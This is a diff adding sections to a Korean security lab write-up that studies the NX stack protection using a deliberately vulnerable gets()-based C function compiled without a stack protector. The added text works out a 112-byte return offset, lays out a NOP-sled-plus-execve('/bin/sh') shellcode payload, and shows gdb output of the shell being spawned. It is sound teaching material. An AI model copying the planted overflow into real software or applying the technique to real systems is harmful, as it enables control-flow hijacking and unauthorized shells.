@@ -271,3 +271,124 @@ info proc mappings
 ---
 
 ## 4. 실습
+
+실습코드: 
+``` c
+void vuln() {
+    char buf[100];
+    gets(buf);        //BOF
+}
+```
+NX 동작을 확인하기 위해 BOF 취약점을 포함시켰다. </br>
+쉘코드를 주입하여 NX off 상태와 on 상태를 비교한다.
+
+공통 컴파일 옵션:
+
+* `-m32`
+* `-O0`
+* `-fno-stack-protector \`
+
+---
+
+## 5. NX off 바이너리 분석
+
+### 5.1. 바이너리 정보
+
+NX 비활성화 바이너리:
+
+```
+[+] nx disabled binary: /tmp/nx-lab/nx-off
+
+/tmp/nx-lab/nx-off: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=df0703489a929ac7bc16bb739d8b5ac84df349ef, for GNU/Linux 3.2.0, not stripped
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   40 Symbols	  No	0		1		/tmp/nx-lab/nx-off
+```
+
+### 5.2. 스택 구조 확인
+
+`vuln()` 함수 디스어셈블:
+
+```
+push   ebp
+mov    ebp,esp
+sub    esp,0x78
+...
+lea    eax,[ebp-0x6c]
+push   eax
+call   gets
+...
+leave
+ret
+```
+
+* `buf` 위치: `ebp - 0x6c`
+* return address 위치: `ebp + 4`
+
+따라서:
+
+```
+ret offset = 0x6c + 4 = 112 bytes
+```
+
+### 5.3. 페이로드 구성
+
+구성:
+
+```
+[nop * 4][shellcode][padding][ret]
+```
+
+* shellcode: `execve("/bin//sh")`
+* ret: `buf` 주소
+
+
+### 5.4. 실행 흐름 관찰 (gdb)
+
+#### 1) ret overwrite 확인
+
+```
+eip = 0xffffcecc
+```
+
+→ 스택 주소로 점프 성공
+
+
+#### 2) 스택 영역 디스어셈블
+
+```
+0xffffcecc: nop
+0xffffcecd: nop
+0xffffcece: nop
+0xffffcecf: nop
+0xffffced0: xor    eax,eax
+...
+0xffffcee6: int    0x80
+```
+
+→ NOP sled 진입 후 shellcode 실행 확인
+
+
+#### 3) execve 실행 확인
+
+```
+process XXXX is executing new program: /usr/bin/dash
+```
+
+→ 쉘코드가 `execve("/bin/sh")` 성공적으로 호출
+
+### 5.5. 관찰 결과
+
+* ret overwrite 성공
+* 제어권 탈취 성공
+* 스택 영역에서 코드 실행 성공
+* execve syscall 성공
+
+즉, NX가 비활성화된 경우 스택에 주입한 shellcode가 정상적으로 실행된다.
+
+
+### 5.6. 참고 사항
+
+* gdb 환경과 일반 실행 환경은 스택 주소가 다를 수 있다.
+* 이는 환경 변수 및 디버깅 오버헤드 차이 때문이다.
+* 본 실습은 NX 동작 관찰이 목적이므로 gdb 기준으로 분석하였다.
